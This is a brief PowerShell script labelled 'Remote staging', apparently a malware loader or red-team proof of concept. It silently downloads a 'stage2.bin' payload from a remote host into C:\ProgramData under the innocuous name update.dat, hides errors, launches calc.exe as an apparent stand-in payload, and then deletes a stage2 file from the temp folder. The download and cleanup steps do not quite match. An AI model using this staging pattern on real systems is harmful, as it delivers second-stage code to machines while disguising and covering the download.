# Remote staging
$FetchUrl = "http://internal.corp:8080/cdn/stage2.bin"
$WorkingPath = 'C:\ProgramData\update.dat'
Invoke-WebRequest -Uri $FetchUrl -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue
& 'calc.exe'
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
